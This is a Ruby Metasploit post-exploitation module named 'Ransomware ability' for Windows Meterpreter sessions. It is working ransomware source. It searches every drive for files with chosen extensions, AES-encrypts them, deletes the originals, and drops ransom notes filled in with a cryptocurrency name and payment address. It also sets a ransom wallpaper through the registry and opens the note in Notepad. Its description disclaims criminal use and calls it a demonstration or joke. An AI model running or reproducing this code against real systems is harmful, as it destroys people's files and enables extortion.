##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ransomware ability',
      'Version'        => '$Release: 1.0',
      'Description'    => %q{
        This module can be useful if you want do a ransomware demonstration or a ... joke.
        Please, do NOT use for criminal purpose.
      },
      'Author'         => [
        'mekhalleh',
        'RAMELLA SÃ©bastien <sebastien.ramella[at]Pirates.RE>'
      ],
      'License'        => 'MSF_LICENSE',
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter']
    ))

    register_options(
      [
        OptString.new('EXTS', [false, 'The extentions you want to encrypt (separed by column)', 'doc,xls,ppt,txt']),
        OptString.new('EXTLIST', [false, 'The extentions you want to encrypt (from file)', '/opt/metasploit/data/malwr/ext_list.txt']),
        OptString.new('SECRET', [false, 'The password you want use to encrypt files (default autogenerated)', nil]),
        OptEnum.new('ALGORITHM', [true, 'The algorithm you want use to encrypt files (default aes-256-cbc)', 'aes-256-cbc',
          [
            'aes-128-cbc',
            'aes-256-cbc'
          ]
        ]),
        OptString.new('EXTOUT', [true, 'The file extention you want use after file encryption', 'cbra']),
        OptString.new('WALLPAPER', [true, 'The wallpaper to be uploaded on the target', '/opt/metasploit/data/malwr/wallpaper.jpg']),
        OptString.new('README', [true, 'The text to be uploaded on the target', '/opt/metasploit/data/malwr/readme.txt']),
        OptString.new('CCNAME', [true, 'The type of crypto currency you want use (ex: bitcoin, monero, ...)', nil]),
        OptString.new('CCADDR', [true, 'The crypto currency address for your payment.', nil])
      ])
  end

  def do_add_readme(rpath, readme_file)
    file_name = readme_file.split("\\")[-1]
    rpath     = rpath + "\\" + file_name
    begin
      client.fs.file.cp(readme_file, rpath)
    rescue Rex::Post::Meterpreter::RequestError
    end
  end

  def do_encrypt_aes(key, algorithm, data)
    key        = Digest::SHA256.digest(key) if(key.kind_of?(String) && 32 != key.bytesize)
    cipher     = OpenSSL::Cipher.new(algorithm).encrypt
    cipher.key = key
    return cipher.update(data) + cipher.final
  end

  def do_encrypt_file(secret, algorithm, path, file)
    path_to_file = path + "\\" + file   
    data         = ""

    # Read file:
    unless client.fs.file.stat(path_to_file).directory?
      fd       = client.fs.file.new(path_to_file, 'rb')
      begin
        until fd.eof?
          data << fd.read
        end
      # EOFError is raised if file is empty, do nothing, just catch!
      rescue EOFError
      end
      fd.close
    end

    # Encrypt file buffer:
    case algorithm.downcase
    when 'aes-128-cbc'
      ciphered = do_encrypt_aes(secret, algorithm, data)
    when 'aes-256-cbc'
      ciphered = do_encrypt_aes(secret, algorithm, data)
    else
      print_error('Crypto: unknown algorithm!')
    end

    # Write encrypted file:
    begin
      fd = client.fs.file.new(path_to_file + "." + datastore['EXTOUT'], 'wb')
      fd.write(ciphered)
      vprint_status(" * rewrite: #{path_to_file}")
      fd.close

      # Remove unencrypted file:
      client.fs.file.rm(path_to_file)
    rescue Rex::Post::Meterpreter::RequestError
    end
  end

  def do_ransomize_files(secret, extentions, algorithm, filter, readme_rpath)
    drives = get_drives
    files  = []

    begin
      drives.each do | drive |
        files |= client.fs.file.search(drive + ":\\", "*.*", recurse = true, timeout = -1)
      end
    rescue Rex::Post::Meterpreter::RequestError
    end

    path = []
    files.each do | file |
      
      unless file['name'].include? filter
        extentions.each do | extention |
          
          if file['name'].downcase.split('.')[-1].eql? extention
            unless path.include? file['path']
              print_status("Current working directory: #{file['path']}")
              path << file['path']
              do_add_readme(file['path'], readme_rpath)
            end

            # Encrypt: All files w/ this extention's
            if file['size'] > 0
              do_encrypt_file(secret, algorithm, file['path'], file['name'])
            end
          end

        end
      end
    end
  end

  ## auxiliary/gather/enum_dns.rb
  def do_save_note(secret)
    data = { 
      'hostname'  => sysinfo['Computer'],
      'secret'    => secret,
      'algorithm' => datastore['ALGORITHM'],
      'ext_out'   => datastore['EXTOUT']
    }

    report_note(
      :type  => "ransomware_ability",
      :data  => data,
      update: :unique_data
    )
  end

  ## post/windows/gather/enum_files.rb
  def get_drives
    a       = client.railgun.kernel32.GetLogicalDrives()["return"]
    drives  = []
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    (0..25).each do | i |
      test = letters[i, 1]
      rem  = a % (2**(i + 1))

      if rem > 0
        drives << test
        a = a - rem
      end
    end
    return drives
  end

  def run
    if datastore['SECRET'].nil?
      password = Rex::Text.rand_text_alphanumeric(256)
    end
    print_status("Starting ransomware ability")
    print_line('    ---------------------------')
    print_good("Secret key: #{password}")
    print_line('    ---------------------------')

    unless datastore['EXTLIST'].nil?
      ext_list   = []
      File.foreach(datastore['EXTLIST'], "\n") do | ext |
        ext_list |= ext.strip.downcase.split("\n")
      end
    else
      unless datastore['EXTS'].nil?
        ext_list = datastore['EXTS'].strip.downcase.split(",")
      else
        print_error('Extention\'s list is empty!')
        return
      end
    end

    suffix            = "#{Rex::Text.rand_text_alpha((rand(8) + 6))}"

    dir_temp          = ""
    if client.platform.include?('windows')
      if is_admin?
        print_good('The remote user have administrator privileges')
        dir_temp = "#{get_env('%WINDIR%')}\\Temp\\"
      else
        print_bad('The remote user don\'t have administrator privileges')
        dir_temp = "#{get_env('%LOCALAPPDATA%')}\\Temp\\"
      end
    end
    client.fs.dir.mkdir(dir_temp) unless exist? (dir_temp)
    
    path_to_wallpaper = "#{dir_temp}wallpaper-#{suffix}.#{datastore['WALLPAPER'].downcase.split('.')[-1]}"
    print_status("Upload at: #{path_to_wallpaper}")
    upload_file(path_to_wallpaper, datastore['WALLPAPER'])
    
    # Format w/ CC infos for "supposed" payment
    readme_buf        = ""
    File.open(datastore['README'], 'r') { | fd | readme_buf = fd.read(fd.stat.size) }
    readme_buf.gsub! '#!CCNAME!#', datastore['CCNAME']
    readme_buf.gsub! '#!CCADDR!#', datastore['CCADDR']
    readme_tmp        = "/tmp/#{Rex::Text::rand_text_alpha_lower(8)}"
    File.open(readme_tmp, 'w') { | fd | fd.write(readme_buf) }

    path_to_readme    = "#{dir_temp}DECRYPT_README-#{suffix}.#{datastore['README'].downcase.split('.')[-1]}"
    print_status("Upload at: #{path_to_readme}")
    upload_file(path_to_readme, readme_tmp)
    File.delete(readme_tmp) if File.exist? (readme_tmp)
    print_line('    ---------------------------')

    do_save_note(password)

    print_good('Processing files encryption')
    do_ransomize_files(password, ext_list, datastore['ALGORITHM'], suffix, path_to_readme)
    print_line('    ---------------------------')

    print_good("Set the 'ransomwarized' userland on the remote target")
    registry_setvaldata("HKCU\\Control Panel\\Desktop", 'Wallpaper', path_to_wallpaper, 'REG_SZ')
    client.sys.process.execute(
      'cmd.exe /c rundll32 user32.dll,UpdatePerUserSystemParameters',
      nil,
      {
        'Hidden' => 'true'
      })

      client.sys.process.execute(
        "cmd.exe /c notepad #{path_to_readme}",
        nil,
        {
          'Hidden' => 'false'
        })
    sleep 5
    print_status("Remove unused: #{path_to_readme}")
    client.fs.file.rm(path_to_readme)
  end

end
